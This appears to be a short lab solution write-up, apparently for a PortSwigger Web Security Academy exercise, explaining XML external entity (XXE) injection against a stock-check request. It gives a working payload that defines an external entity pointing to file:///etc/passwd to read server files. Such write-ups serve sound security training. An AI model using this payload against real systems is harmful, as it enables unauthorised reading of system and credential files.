## Exploiting XXE using external entities to retrieve files

## Solution

Exploiting XXE to retrieve files
To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.
For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/10a54b08-cdaa-4449-958f-abf141e31b9b">

```<?xml version="1.0" encoding="UTF-8"?>```
```<stockCheck><productId>381</productId></stockCheck>```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload:

```<?xml version="1.0" encoding="UTF-8"?>```
```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>```
```<stockCheck><productId>&xxe;</productId></stockCheck>```

<img width="1430" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/7c556697-9d60-4a78-b1b3-8691136b1c5f">

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/4b2a9ba5-045d-4e80-9891-3b5d0378581e">
